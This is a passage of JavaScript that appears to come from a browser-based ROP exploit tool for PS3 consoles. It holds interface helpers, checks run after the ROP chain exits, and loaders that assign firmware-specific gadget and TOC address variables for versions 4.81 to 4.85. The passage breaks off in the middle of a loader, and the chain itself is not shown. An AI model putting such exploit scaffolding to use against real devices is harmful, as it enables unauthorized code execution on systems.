	if((parseInt(t_val,16)!==0)&&(parseInt(t_val2,16)!==0)&&(parseInt(t_val3,16)!==0)&&(parseInt(t_val4,16)!==0)&&(parseInt(t_val5,16)!==0)&&(parseInt(t_val,16)===(parseInt(t_val6,16)))&&(parseInt(t_val2,16)===(parseInt(t_val7,16)))&&(parseInt(t_val3,16)===(parseInt(t_val8,16)))&&(parseInt(t_val4,16)===(parseInt(t_val9,16)))&&(parseInt(t_val5,16)===(parseInt(t_val10,16))))
	{
		var el=document.getElementById('auto_close');
		if(el)
		{
			if(el.checked===true)window.close();
		}
		tmp=suc;
	}
	else 
	{
		if((parseInt(t_val,16)!==parseInt(t_val6,16))||(parseInt(t_val,16)===0))fail+=fail1;
		if((parseInt(t_val2,16)!==parseInt(t_val7,16))||(parseInt(t_val2,16)===0))fail+=fail2;
		if((parseInt(t_val3,16)!==parseInt(t_val8,16))||(parseInt(t_val3,16)===0))fail+=fail3;
		if((parseInt(t_val4,16)!==parseInt(t_val9,16))||(parseInt(t_val4,16)===0))fail+=fail4;
		if((parseInt(t_val5,16)!==parseInt(t_val10,16))||(parseInt(t_val5,16)===0))fail+=fail5;
		tmp=fail;
	}
	showResult(tmp);
}
function rop_exit_4val(suc,fail,fail1,fail2,fail3,fail4)
{
	// operations to execute on ROP exit
	var t_val=xtra_data.substr(store_idx_arr1[0],2).toAscii(true);
	var t_val2=xtra_data.substr(store_idx_arr1[1],2).toAscii(true);
	var t_val3=xtra_data.substr(store_idx_arr1[2],2).toAscii(true);
	var t_val4=xtra_data.substr(store_idx_arr1[3],2).toAscii(true);
	var t_val6=xtra_data.substr(store_idx_arr2[0],2).toAscii(true);
	var t_val7=xtra_data.substr(store_idx_arr2[1],2).toAscii(true);
	var t_val8=xtra_data.substr(store_idx_arr2[2],2).toAscii(true);
	var t_val9=xtra_data.substr(store_idx_arr2[3],2).toAscii(true);
	var tmp;
	
	if((parseInt(t_val,16)!==0)&&(parseInt(t_val2,16)!==0)&&(parseInt(t_val3,16)!==0)&&(parseInt(t_val4,16)!==0)&&(parseInt(t_val5,16)!==0)&&(parseInt(t_val,16)===(parseInt(t_val6,16)))&&(parseInt(t_val2,16)===(parseInt(t_val7,16)))&&(parseInt(t_val3,16)===(parseInt(t_val8,16)))&&(parseInt(t_val4,16)===(parseInt(t_val9,16))))
	{
		var el=document.getElementById('auto_close');
		if(el)
		{
			if(el.checked===true)window.close();
		}
		tmp=suc;
	}
	else 
	{
		if((parseInt(t_val,16)!==parseInt(t_val6,16))||(parseInt(t_val,16)===0))fail+=fail1;
		if((parseInt(t_val2,16)!==parseInt(t_val7,16))||(parseInt(t_val2,16)===0))fail+=fail2;
		if((parseInt(t_val3,16)!==parseInt(t_val8,16))||(parseInt(t_val3,16)===0))fail+=fail3;
		if((parseInt(t_val4,16)!==parseInt(t_val9,16))||(parseInt(t_val4,16)===0))fail+=fail4;
		tmp=fail;
	}
	showResult(tmp);
}
function rop_exit_3val(suc,fail,fail1,fail2,fail3)
{
	// operations to execute on ROP exit
	var t_val=xtra_data.substr(store_idx_arr1[0],2).toAscii(true);
	var t_val2=xtra_data.substr(store_idx_arr1[1],2).toAscii(true);
	var t_val3=xtra_data.substr(store_idx_arr1[2],2).toAscii(true);
	var t_val4=xtra_data.substr(store_idx_arr2[0],2).toAscii(true);
	var t_val5=xtra_data.substr(store_idx_arr2[1],2).toAscii(true);
	var t_val6=xtra_data.substr(store_idx_arr2[2],2).toAscii(true);
	var tmp;
	//logAdd('store_idx='+store_idx_arr1[0].toString()+br+'t_val='+t_val+br+'store_idx2='+store_idx_arr1[1].toString()+br+'t_val2='+t_val2+br+'store_idx3='+store_idx_arr1[2].toString()+br+'t_val3='+t_val3);
	//logAdd('store_idx4='+store_idx_arr2[0].toString()+br+'t_val4='+t_val4+br+'store_idx5='+store_idx_arr2[1].toString()+br+'t_val5='+t_val5+br+'store_idx6='+sto2e_idx_arr2[0].toString()+br+'t_val6='+t_val6);
	if((parseInt(t_val,16)!==0)&&(parseInt(t_val2,16)!==0)&&(parseInt(t_val3,16)!==0)&&(parseInt(t_val,16)===(parseInt(t_val4,16)))&&(parseInt(t_val2,16)===(parseInt(t_val5,16)))&&(parseInt(t_val3,16)===(parseInt(t_val6,16))))
	{
		var el=document.getElementById('auto_close');
		if(el)
		{
			if(el.checked===true)window.close();
		}
		tmp=suc;
	}
	else 
	{
		if((parseInt(t_val,16)!==parseInt(t_val4,16))||(parseInt(t_val,16)===0))fail+=fail1;
		if((parseInt(t_val2,16)!==parseInt(t_val5,16))||(parseInt(t_val2,16)===0))fail+=fail2;
		if((parseInt(t_val3,16)!==parseInt(t_val6,16))||(parseInt(t_val3,16)===0))fail+=fail3;
		tmp=fail;
	}
	showResult(tmp);
}
function rop_exit_2val(suc,fail,fail1,fail2)
{
	// operations to execute on ROP exit
	var t_val=xtra_data.substr(store_idx_arr1[0],2).toAscii(true);
	var t_val2=xtra_data.substr(store_idx_arr1[1],2).toAscii(true);
	var t_val3=xtra_data.substr(store_idx_arr2[0],2).toAscii(true);
	var t_val4=xtra_data.substr(store_idx_arr2[1],2).toAscii(true);
	var tmp;
	//logAdd('store_idx_arr1[0]='+store_idx_arr1[0].toString()+br+'t_val='+t_val+br+'store_idx_arr1[1]='+store_idx_arr1[1].toString()+br+'t_val2='+t_val2+br+'store_idx_arr2[0]='+store_idx_arr2[0].toString()+br+'t_val3='+t_val3+br+'store_idx_arr2[1]='+store_idx_arr2[1].toString()+br+'t_val4='+t_val4);
	if((parseInt(t_val,16)!==0)&&(parseInt(t_val2,16)!==0)&&(parseInt(t_val,16)===(parseInt(t_val3,16)))&&(parseInt(t_val2,16)===(parseInt(t_val4,16))))
	{
		var el=document.getElementById('auto_close');
		if(el)
		{
			if(el.checked===true)window.close();
		}
		tmp=suc;
	}
	else 
	{
		if((parseInt(t_val,16)!==parseInt(t_val3,16))||(parseInt(t_val,16)===0))fail+=fail1;
		if((parseInt(t_val2,16)!==parseInt(t_val4,16))||(parseInt(t_val2,16)===0))fail+=fail2;
		tmp=fail;
	}
	showResult(tmp);
}
function rop_exit_1val(suc,fail,fail1)
{
	// operations to execute on ROP exit
	var t_val=xtra_data.substr(store_idx_arr1[0],2).toAscii(true);
	var t_val2=xtra_data.substr(store_idx_arr2[0],2).toAscii(true);
	var tmp;
	//logAdd('store_idx='+store_idx.toString()+br+'t_val='+t_val+br+'store_idx2='+store_idx2.toString()+br+'t_val2='+t_val2);
	if((parseInt(t_val,16)!==0)&&(parseInt(t_val,16)===(parseInt(t_val2,16))))
	{
		var el=document.getElementById('auto_close');
		if(el){if(el.checked===true)window.close();}
		tmp=suc;
	}
	else 
	{
		if(fail1){if((parseInt(t_val,16)!==parseInt(t_val2,16))||(parseInt(t_val,16)===0))fail+=fail1;}
		tmp=fail;
	}
	showResult(tmp);
}
function rop_exit(suc)
{
	// // operations to execute on ROP exit
	var el=document.getElementById('auto_close');
	if(el)
	{
		if(el.checked===true)window.close();
	}
	showResult(suc);	
}
function load_check()
{
	if(total_loops<max_loops)
	{
		showResult(progress_msg_frag1+((100/max_loops)*total_loops).toString()+progress_msg_frag2);
		t_out=setTimeout(initROP,1000,false);
	}
	else
	{
		total_loops=0;
		showResult(fail_msg_frag);
		cleanGUI();
	}
}
function setText(elem,str)
{
	if(elem){elem.text=str;}
}
function getText(elem)
{
	if(elem){return elem.text;}
}
function getIndex(elem)
{
	if(elem){return elem.selectedIndex;}
}
function getTextBoxValue(elem)
{
	if(elem){return getValue(elem);}
}
function getComboSelectedText(elem)
{
	if(elem){return getText(elem.options[getComboSelectedIndex(elem)]);}
}
function getComboSelectedIndex(elem)
{
	if(elem){return getIndex(elem);}
}
function getComboSelectedValue(elem)
{
	if(elem){return getValue(elem.options[getComboSelectedIndex(elem)]);}
}

function getexecText()
{
	//return getComboSelectedText(document.getElementById('comboexecPath'));
	return spath.substr(4,spath.length-4)+getgameIdValue()+eboot;
}
function getexecIndex()
{
	return getComboSelectedIndex(document.getElementById('comboexecPath'));
}

function getexecValue()
{
	//return getComboSelectedValue(document.getElementById('comboexecPath'));
	return spath+getgameIdValue()+eboot;
}

function getrootPath()
{
	return getComboSelectedValue(document.getElementById('combofilePath'));
}
function getactPath()
{
	return getComboSelectedValue(document.getElementById('comboactPath'));
}
function getactPathText()
{
	return getComboSelectedText(document.getElementById('comboactPath'));
}
function getdestFile()
{
	return getComboSelectedText(document.getElementById('combodestFile'));
}
function getdestPath()
{
	return getComboSelectedText(document.getElementById('combodestPath'));
}
function getComboPatchOffsetText()
{
	return getComboSelectedText(document.getElementById('comboPatchOffset'));
}
function getPatchOffsetText()
{
	return getComboSelectedText(document.getElementById('patchOffset'));
}
function getPatchValueText()
{
	return getComboSelectedText(document.getElementById('patchValue'));
}
function getPatchSizeText()
{
	return getComboSelectedText(document.getElementById('patchSize'));
}
function getPatchSizeNewText()
{
	return getComboSelectedText(document.getElementById('patchSizeNew'));
}
function getComboPatchOffsetValue()
{
	return getTextBoxValue(document.getElementById('comboPatchOffset'));
}
function getPatchOffsetValue()
{
	return getTextBoxValue(document.getElementById('patchOffset'));
}
function getPatchValueValue()
{
	return getTextBoxValue(document.getElementById('patchValue'));
}
function getPatchSizeValue()
{
	return getTextBoxValue(document.getElementById('patchSize'));
}
function getPatchSizeNewValue()
{
	return getTextBoxValue(document.getElementById('patchSizeNew'));
}
function getRifValue()
{
	return getTextBoxValue(document.getElementById('txtrif'));
}
function getPath(rel_path)
{
	return getrootPath()+rel_path;
}

function getgameIdValue()
{
	return getTextBoxValue(document.getElementById('txtgameId'));
}
function disable_tbxs()
{
	disable_element(document.getElementById('txtgameId'));
}

function enable_tbxs()
{
	enable_element(document.getElementById('txtgameId'));
}
function setValue(elem,str)
{
	if(elem){elem.value=str;}
}
function getValue(elem)
{
	if(elem){return elem.value;}
}
function setInnerHTML(elem,str)
{
	if(elem){elem.innerHTML=str;}

}
function addInnerHTML(elem,str)
{
	if(elem){elem.innerHTML+=str;}
}
function setVisible(elem)
{
	if(elem){elem.style.visibility='visible';}
}
function setInvisible(elem)
{
	if(elem){elem.style.visibility='hidden';}
}
function enable_element(elem)
{
	if(elem){elem.disabled=false;}
}
function disable_element(elem)
{
	if(elem){elem.disabled=true;}
}
function cbcheck(elem)
{
	if(elem){elem.checked=true;}
}
function cbuncheck(elem)
{
	if(elem){elem.checked=false;}
}
function enable_trigger()
{
	enable_element(document.getElementById('btnTrigger'));
	enable_resetbtn();
	//enable_cboptions();
}
function enable_all()
{
	enable_tbxs();
	enable_cmboptions();
	enable_cboptions();
	enable_btn();
}
function disable_all()
{
	disable_tbxs();
	disable_cmboptions();
	disable_cboptions();
	disable_btn();
}
function cleanGUI()
{
	enable_all();
	disable_element(document.getElementById('btnTrigger'));
	disable_resetbtn();
	clearLogEntry();
	t_out=0;
	total_loops=0;
}
function disable_trigger()
{
	if(document.getElementById('btnTrigger')){if(document.getElementById('btnTrigger').disabled===false){clearResultEntry();}}
	else {throw "btnTrigger: HTML error";}
	cleanGUI();
}

function disable_cboptions()
{
	disable_element(document.getElementById('dex'));
	disable_element(document.getElementById('auto_close'));
	disable_element(document.getElementById('auto_reboot'));
}

function enable_cboptions()
{
	enable_element(document.getElementById('dex'));
	enable_element(document.getElementById('auto_close'));
	enable_element(document.getElementById('auto_reboot'));
}

function disable_cmboptions()
{
	disable_element(document.getElementById('comboexecPath'));
	disable_element(document.getElementById('comboactPath'));
	disable_element(document.getElementById('combofilePath'));
}

function enable_cmboptions()
{
	enable_element(document.getElementById('comboexecPath'));
	enable_element(document.getElementById('comboactPath'));
	enable_element(document.getElementById('combofilePath'));
}
function enable_resetbtn()
{
	setVisible(document.getElementById('reset'));
}
function disable_resetbtn()
{
	setInvisible(document.getElementById('reset'));
}
function disable_btn()
{
	disable_element(document.getElementById('btnTrigger'));
	disable_element(document.getElementById('btnROP'));
}
function enable_btn()
{
	enable_element(document.getElementById('btnTrigger'));
	enable_element(document.getElementById('btnROP'));
}
function selectfilePath()
{
	//var idx=getexecIndex();
	//if((idx===0)||(idx===1)||(idx===2)){f_off_start=0;f_off=0;}
	disable_trigger();
}
function autoclose()
{
}
function autoreboot()
{
}
function loaddex_481()
{
	toc_addr = toc_addr_481_d;
	vsh_opd_addr=vsh_opd_addr_481_d;
	vsh_opd_patch=vsh_opd_patch_481_d;
	vsh_toc_addr_screenshot=vsh_toc_addr_screenshot_481_d;
	vsh_ps3xploit_key_toc=vsh_ps3xploit_key_toc_481_d;
	default_vsh_pub_toc=default_vsh_pub_toc_481_d;
	toc_entry1_addr=toc_entry1_addr_481_d;
	toc_entry2_addr=toc_entry2_addr_481_d;
	toc_entry3_addr=toc_entry3_addr_481_d;
	toc_entry4_addr=toc_entry4_addr_481_d;
	toc_entry5_addr=toc_entry5_addr_481_d;
	toc_entry6_addr=toc_entry6_addr_481_d;
	gadget1_addr=gadget1_addr_481_d;
	gadget2_addr=gadget2_addr_481_d;
	gadget3_addr=gadget3_addr_481_d;
	gadget4_addr=gadget4_addr_481_d;
	gadget5_addr=gadget5_addr_481_d;
	gadget6_addr=gadget6_addr_481_d;
	gadget7_addr=gadget7_addr_481_d;
	gadget8_addr=gadget8_addr_481_d;
	gadget9_addr=gadget9_addr_481_d;
	gadget10_addr=gadget10_addr_481_d;
	gadget11_addr=gadget11_addr_481_d;
	gadget12_addr=gadget12_addr_481_d;
	gadget13_addr=gadget13_addr_481_d;
	gadget14_addr=gadget14_addr_481_d;
	gadget15_addr=gadget15_addr_481_d;
	gadget_mod1_addr=gadget_mod1_addr_481_d;
	gadget_mod2_addr=gadget_mod2_addr_481_d;
	gadget_mod3_addr=gadget_mod3_addr_481_d;
	gadget_mod4a_addr=gadget_mod4a_addr_481_d;
	gadget_mod4b_addr=gadget_mod4b_addr_481_d;
	gadget_mod4c_addr=gadget_mod4c_addr_481_d;
	gadget_mod5_addr=gadget_mod5_addr_481_d;
	gadget_mod6_addr=gadget_mod6_addr_481_d;
	gadget_mod7_addr=gadget_mod7_addr_481_d;
	gadget_mod8_addr=gadget_mod8_addr_481_d;
	gadget_mod9_addr=gadget_mod9_addr_481_d;
	gadget_mod10_addr=gadget_mod10_addr_481_d;
	gadget_mod11_addr=gadget_mod11_addr_481_d;
	gadget_mod12_addr=gadget_mod12_addr_481_d;
	gadget_mod13_addr=gadget_mod13_addr_481_d;
	gadget_mod14_addr=gadget_mod14_addr_481_d;
	gadget_mod15_addr=gadget_mod15_addr_481_d;
	gadget_mod16_addr=gadget_mod16_addr_481_d;
	ipf1_addr=ipf1_addr_481_d;
	ipf2_addr=ipf2_addr_481_d;
}
function loadcex_481()
{
	toc_addr = toc_addr_481;
	vsh_opd_addr=vsh_opd_addr_481;
	vsh_opd_patch=vsh_opd_patch_481;
	vsh_toc_addr_screenshot=vsh_toc_addr_screenshot_481;
	vsh_ps3xploit_key_toc=vsh_ps3xploit_key_toc_481;
	default_vsh_pub_toc=default_vsh_pub_toc_481;
	toc_entry1_addr=toc_entry1_addr_481;
	toc_entry2_addr=toc_entry2_addr_481;
	toc_entry3_addr=toc_entry3_addr_481;
	toc_entry4_addr=toc_entry4_addr_481;
	toc_entry5_addr=toc_entry5_addr_481;
	toc_entry6_addr=toc_entry6_addr_481;
	gadget1_addr=gadget1_addr_481;
	gadget2_addr=gadget2_addr_481;
	gadget3_addr=gadget3_addr_481;
	gadget4_addr=gadget4_addr_481;
	gadget5_addr=gadget5_addr_481;
	gadget6_addr=gadget6_addr_481;
	gadget7_addr=gadget7_addr_481;
	gadget8_addr=gadget8_addr_481;
	gadget9_addr=gadget9_addr_481;
	gadget10_addr=gadget10_addr_481;
	gadget11_addr=gadget11_addr_481;
	gadget12_addr=gadget12_addr_481;
	gadget13_addr=gadget13_addr_481;
	gadget14_addr=gadget14_addr_481;
	gadget15_addr=gadget15_addr_481;
	gadget_mod1_addr=gadget_mod1_addr_481;
	gadget_mod2_addr=gadget_mod2_addr_481;
	gadget_mod3_addr=gadget_mod3_addr_481;
	gadget_mod4a_addr=gadget_mod4a_addr_481;
	gadget_mod4b_addr=gadget_mod4b_addr_481;
	gadget_mod4c_addr=gadget_mod4c_addr_481;
	gadget_mod5_addr=gadget_mod5_addr_481;
	gadget_mod6_addr=gadget_mod6_addr_481;
	gadget_mod7_addr=gadget_mod7_addr_481;
	gadget_mod8_addr=gadget_mod8_addr_481;
	gadget_mod9_addr=gadget_mod9_addr_481;
	gadget_mod10_addr=gadget_mod10_addr_481;
	gadget_mod11_addr=gadget_mod11_addr_481;
	gadget_mod12_addr=gadget_mod12_addr_481;
	gadget_mod13_addr=gadget_mod13_addr_481;
	gadget_mod14_addr=gadget_mod14_addr_481;
	gadget_mod15_addr=gadget_mod15_addr_481;
	gadget_mod16_addr=gadget_mod16_addr_481;
	ipf1_addr=ipf1_addr_481;
	ipf2_addr=ipf2_addr_481;
}
function loaddex_482()
{
	toc_addr = toc_addr_482_d;
	prx_explore_plugin_toc_addr=prx_explore_plugin_toc_addr_482_d;
	vsh_whatsnew_patch_addr=vsh_whatsnew_patch_addr_482_d;
	vsh_whatsnew_xml_addr=vsh_whatsnew_xml_addr_482_d;
	vsh_opd_addr=vsh_opd_addr_482_d;
	vsh_opd_patch=vsh_opd_patch_482_d;
	vsh_toc_addr_screenshot=vsh_toc_addr_screenshot_482_d;
	vsh_ps3xploit_key_toc=vsh_ps3xploit_key_toc_482_d;
	default_vsh_pub_toc=default_vsh_pub_toc_482_d;
	toc_entry1_addr=toc_entry1_addr_482_d;
	toc_entry2_addr=toc_entry2_addr_482_d;
	toc_entry3_addr=toc_entry3_addr_482_d;
	toc_entry4_addr=toc_entry4_addr_482_d;
	toc_entry5_addr=toc_entry5_addr_482_d;
	toc_entry6_addr=toc_entry6_addr_482_d;
	gadget1_addr=gadget1_addr_482_d;
	gadget2_addr=gadget2_addr_482_d;
	gadget3_addr=gadget3_addr_482_d;
	gadget4_addr=gadget4_addr_482_d;
	gadget5_addr=gadget5_addr_482_d;
	gadget6_addr=gadget6_addr_482_d;
	gadget7_addr=gadget7_addr_482_d;
	gadget8_addr=gadget8_addr_482_d;
	gadget9_addr=gadget9_addr_482_d;
	gadget10_addr=gadget10_addr_482_d;
	gadget11_addr=gadget11_addr_482_d;
	gadget12_addr=gadget12_addr_482_d;
	gadget13_addr=gadget13_addr_482_d;
	gadget14_addr=gadget14_addr_482_d;
	gadget15_addr=gadget15_addr_482_d;
	gadget_mod1_addr=gadget_mod1_addr_482_d;
	gadget_mod2_addr=gadget_mod2_addr_482_d;
	gadget_mod3_addr=gadget_mod3_addr_482_d;
	gadget_mod4a_addr=gadget_mod4a_addr_482_d;
	gadget_mod4b_addr=gadget_mod4b_addr_482_d;
	gadget_mod4c_addr=gadget_mod4c_addr_482_d;
	gadget_mod5_addr=gadget_mod5_addr_482_d;
	gadget_mod6_addr=gadget_mod6_addr_482_d;
	gadget_mod7_addr=gadget_mod7_addr_482_d;
	gadget_mod8_addr=gadget_mod8_addr_482_d;
	gadget_mod9_addr=gadget_mod9_addr_482_d;
	gadget_mod10_addr=gadget_mod10_addr_482_d;
	gadget_mod11_addr=gadget_mod11_addr_482_d;
	gadget_mod12_addr=gadget_mod12_addr_482_d;
	gadget_mod13_addr=gadget_mod13_addr_482_d;
	gadget_mod14_addr=gadget_mod14_addr_482_d;
	gadget_mod15_addr=gadget_mod15_addr_482_d;
	gadget_mod16_addr=gadget_mod16_addr_482_d;
	ipf1_addr=ipf1_addr_482_d;
	ipf2_addr=ipf2_addr_482_d;
}
function loadcex_482()
{
	toc_addr = toc_addr_482;
	vsh_opd_addr=vsh_opd_addr_482;
	vsh_opd_patch=vsh_opd_patch_482;
	vsh_toc_addr_screenshot=vsh_toc_addr_screenshot_482;
	vsh_ps3xploit_key_toc=vsh_ps3xploit_key_toc_482;
	default_vsh_pub_toc=default_vsh_pub_toc_482;
	toc_entry1_addr=toc_entry1_addr_482;
	toc_entry2_addr=toc_entry2_addr_482;
	toc_entry3_addr=toc_entry3_addr_482;
	toc_entry4_addr=toc_entry4_addr_482;
	toc_entry5_addr=toc_entry5_addr_482;
	toc_entry6_addr=toc_entry6_addr_482;
	gadget1_addr=gadget1_addr_482;
	gadget2_addr=gadget2_addr_482;
	gadget3_addr=gadget3_addr_482;
	gadget4_addr=gadget4_addr_482;
	gadget5_addr=gadget5_addr_482;
	gadget6_addr=gadget6_addr_482;
	gadget7_addr=gadget7_addr_482;
	gadget8_addr=gadget8_addr_482;
	gadget9_addr=gadget9_addr_482;
	gadget10_addr=gadget10_addr_482;
	gadget11_addr=gadget11_addr_482;
	gadget12_addr=gadget12_addr_482;
	gadget13_addr=gadget13_addr_482;
	gadget14_addr=gadget14_addr_482;
	gadget15_addr=gadget15_addr_482;
	gadget_mod1_addr=gadget_mod1_addr_482;
	gadget_mod2_addr=gadget_mod2_addr_482;
	gadget_mod3_addr=gadget_mod3_addr_482;
	gadget_mod4a_addr=gadget_mod4a_addr_482;
	gadget_mod4b_addr=gadget_mod4b_addr_482;
	gadget_mod4c_addr=gadget_mod4c_addr_482;
	gadget_mod5_addr=gadget_mod5_addr_482;
	gadget_mod6_addr=gadget_mod6_addr_482;
	gadget_mod7_addr=gadget_mod7_addr_482;
	gadget_mod8_addr=gadget_mod8_addr_482;
	gadget_mod9_addr=gadget_mod9_addr_482;
	gadget_mod10_addr=gadget_mod10_addr_482;
	gadget_mod11_addr=gadget_mod11_addr_482;
	gadget_mod12_addr=gadget_mod12_addr_482;
	gadget_mod13_addr=gadget_mod13_addr_482;
	gadget_mod14_addr=gadget_mod14_addr_482;
	gadget_mod15_addr=gadget_mod15_addr_482;
	gadget_mod16_addr=gadget_mod16_addr_482;
	ipf1_addr=ipf1_addr_482;
	ipf2_addr=ipf2_addr_482;
}
function loadcex_483()
{
	toc_addr = toc_addr_483;
	vsh_opd_addr=vsh_opd_addr_483;
	vsh_opd_patch=vsh_opd_patch_483;
	vsh_toc_addr_screenshot=vsh_toc_addr_screenshot_483;
	vsh_ps3xploit_key_toc=vsh_ps3xploit_key_toc_483;
	default_vsh_pub_toc=default_vsh_pub_toc_483;
	toc_entry1_addr=toc_entry1_addr_483;
	toc_entry2_addr=toc_entry2_addr_483;
	toc_entry3_addr=toc_entry3_addr_483;
	toc_entry4_addr=toc_entry4_addr_483;
	toc_entry5_addr=toc_entry5_addr_483;
	toc_entry6_addr=toc_entry6_addr_483;
	gadget1_addr=gadget1_addr_483;
	gadget2_addr=gadget2_addr_483;
	gadget3_addr=gadget3_addr_483;
	gadget4_addr=gadget4_addr_483;
	gadget5_addr=gadget5_addr_483;
	gadget6_addr=gadget6_addr_483;
	gadget7_addr=gadget7_addr_483;
	gadget8_addr=gadget8_addr_483;
	gadget9_addr=gadget9_addr_483;
	gadget10_addr=gadget10_addr_483;
	gadget11_addr=gadget11_addr_483;
	gadget12_addr=gadget12_addr_483;
	gadget13_addr=gadget13_addr_483;
	gadget14_addr=gadget14_addr_483;
	gadget15_addr=gadget15_addr_483;
	gadget_mod1_addr=gadget_mod1_addr_483;
	gadget_mod2_addr=gadget_mod2_addr_483;
	gadget_mod3_addr=gadget_mod3_addr_483;
	gadget_mod4a_addr=gadget_mod4a_addr_483;
	gadget_mod4b_addr=gadget_mod4b_addr_483;
	gadget_mod4c_addr=gadget_mod4c_addr_483;
	gadget_mod5_addr=gadget_mod5_addr_483;
	gadget_mod6_addr=gadget_mod6_addr_483;
	gadget_mod7_addr=gadget_mod7_addr_483;
	gadget_mod8_addr=gadget_mod8_addr_483;
	gadget_mod9_addr=gadget_mod9_addr_483;
	gadget_mod10_addr=gadget_mod10_addr_483;
	gadget_mod11_addr=gadget_mod11_addr_483;
	gadget_mod12_addr=gadget_mod12_addr_483;
	gadget_mod13_addr=gadget_mod13_addr_483;
	gadget_mod14_addr=gadget_mod14_addr_483;
	gadget_mod15_addr=gadget_mod15_addr_483;
	gadget_mod16_addr=gadget_mod16_addr_483;
	ipf1_addr=ipf1_addr_483;
	ipf2_addr=ipf2_addr_483;
}
function loaddex_484()
{
	toc_addr = toc_addr_484_d;
	vsh_opd_addr=vsh_opd_addr_484_d;
	vsh_opd_patch=vsh_opd_patch_484_d;
	vsh_toc_addr_screenshot=vsh_toc_addr_screenshot_484_d;
	vsh_ps3xploit_key_toc=vsh_ps3xploit_key_toc_484_d;
	default_vsh_pub_toc=default_vsh_pub_toc_484_d;
	toc_entry1_addr=toc_entry1_addr_484_d;
	toc_entry2_addr=toc_entry2_addr_484_d;
	toc_entry3_addr=toc_entry3_addr_484_d;
	toc_entry4_addr=toc_entry4_addr_484_d;
	toc_entry5_addr=toc_entry5_addr_484_d;
	toc_entry6_addr=toc_entry6_addr_484_d;
	gadget1_addr=gadget1_addr_484_d;
	gadget2_addr=gadget2_addr_484_d;
	gadget3_addr=gadget3_addr_484_d;
	gadget4_addr=gadget4_addr_484_d;
	gadget5_addr=gadget5_addr_484_d;
	gadget6_addr=gadget6_addr_484_d;
	gadget7_addr=gadget7_addr_484_d;
	gadget8_addr=gadget8_addr_484_d;
	gadget9_addr=gadget9_addr_484_d;
	gadget10_addr=gadget10_addr_484_d;
	gadget11_addr=gadget11_addr_484_d;
	gadget12_addr=gadget12_addr_484_d;
	gadget13_addr=gadget13_addr_484_d;
	gadget14_addr=gadget14_addr_484_d;
	gadget15_addr=gadget15_addr_484_d;
	gadget_mod1_addr=gadget_mod1_addr_484_d;
	gadget_mod2_addr=gadget_mod2_addr_484_d;
	gadget_mod3_addr=gadget_mod3_addr_484_d;
	gadget_mod4a_addr=gadget_mod4a_addr_484_d;
	gadget_mod4b_addr=gadget_mod4b_addr_484_d;
	gadget_mod4c_addr=gadget_mod4c_addr_484_d;
	gadget_mod5_addr=gadget_mod5_addr_484_d;
	gadget_mod6_addr=gadget_mod6_addr_484_d;
	gadget_mod7_addr=gadget_mod7_addr_484_d;
	gadget_mod8_addr=gadget_mod8_addr_484_d;
	gadget_mod9_addr=gadget_mod9_addr_484_d;
	gadget_mod10_addr=gadget_mod10_addr_484_d;
	gadget_mod11_addr=gadget_mod11_addr_484_d;
	gadget_mod12_addr=gadget_mod12_addr_484_d;
	gadget_mod13_addr=gadget_mod13_addr_484_d;
	gadget_mod14_addr=gadget_mod14_addr_484_d;
	gadget_mod15_addr=gadget_mod15_addr_484_d;
	gadget_mod16_addr=gadget_mod16_addr_484_d;
	ipf1_addr=ipf1_addr_484_d;
	ipf2_addr=ipf2_addr_484_d;
}
function loadcex_484()
{
	toc_addr = toc_addr_484;
	vsh_opd_addr=vsh_opd_addr_484;
	vsh_opd_patch=vsh_opd_patch_484;
	vsh_toc_addr_screenshot=vsh_toc_addr_screenshot_484;
	vsh_ps3xploit_key_toc=vsh_ps3xploit_key_toc_484;
	default_vsh_pub_toc=default_vsh_pub_toc_484;
	toc_entry1_addr=toc_entry1_addr_484;
	toc_entry2_addr=toc_entry2_addr_484;
	toc_entry3_addr=toc_entry3_addr_484;
	toc_entry4_addr=toc_entry4_addr_484;
	toc_entry5_addr=toc_entry5_addr_484;
	toc_entry6_addr=toc_entry6_addr_484;
	gadget1_addr=gadget1_addr_484;
	gadget2_addr=gadget2_addr_484;
	gadget3_addr=gadget3_addr_484;
	gadget4_addr=gadget4_addr_484;
	gadget5_addr=gadget5_addr_484;
	gadget6_addr=gadget6_addr_484;
	gadget7_addr=gadget7_addr_484;
	gadget8_addr=gadget8_addr_484;
	gadget9_addr=gadget9_addr_484;
	gadget10_addr=gadget10_addr_484;
	gadget11_addr=gadget11_addr_484;
	gadget12_addr=gadget12_addr_484;
	gadget13_addr=gadget13_addr_484;
	gadget14_addr=gadget14_addr_484;
	gadget15_addr=gadget15_addr_484;
	gadget_mod1_addr=gadget_mod1_addr_484;
	gadget_mod2_addr=gadget_mod2_addr_484;
	gadget_mod3_addr=gadget_mod3_addr_484;
	gadget_mod4a_addr=gadget_mod4a_addr_484;
	gadget_mod4b_addr=gadget_mod4b_addr_484;
	gadget_mod4c_addr=gadget_mod4c_addr_484;
	gadget_mod5_addr=gadget_mod5_addr_484;
	gadget_mod6_addr=gadget_mod6_addr_484;
	gadget_mod7_addr=gadget_mod7_addr_484;
	gadget_mod8_addr=gadget_mod8_addr_484;
	gadget_mod9_addr=gadget_mod9_addr_484;
	gadget_mod10_addr=gadget_mod10_addr_484;
	gadget_mod11_addr=gadget_mod11_addr_484;
	gadget_mod12_addr=gadget_mod12_addr_484;
	gadget_mod13_addr=gadget_mod13_addr_484;
	gadget_mod14_addr=gadget_mod14_addr_484;
	gadget_mod15_addr=gadget_mod15_addr_484;
	gadget_mod16_addr=gadget_mod16_addr_484;
	ipf1_addr=ipf1_addr_484;
	ipf2_addr=ipf2_addr_484;
}
function loadcex_485()
{
	toc_addr = toc_addr_485;
	vsh_opd_addr=vsh_opd_addr_485;
	vsh_opd_patch=vsh_opd_patch_485;
	vsh_toc_addr_screenshot=vsh_toc_addr_screenshot_485;
	vsh_ps3xploit_key_toc=vsh_ps3xploit_key_toc_485;
	default_vsh_pub_toc=default_vsh_pub_toc_485;
	toc_entry1_addr=toc_entry1_addr_485;
	toc_entry2_addr=toc_entry2_addr_485;
	toc_entry3_addr=toc_entry3_addr_485;
	toc_entry4_addr=toc_entry4_addr_485;
	toc_entry5_addr=toc_entry5_addr_485;
	toc_entry6_addr=toc_entry6_addr_485;
	gadget1_addr=gadget1_addr_485;
	gadget2_addr=gadget2_addr_485;
	gadget3_addr=gadget3_addr_485;
	gadget4_addr=gadget4_addr_485;
	gadget5_addr=gadget5_addr_485;
	gadget6_addr=gadget6_addr_485;
	gadget7_addr=gadget7_addr_485;
	gadget8_addr=gadget8_addr_485;
	gadget9_addr=gadget9_addr_485;
	gadget10_addr=gadget10_addr_485;
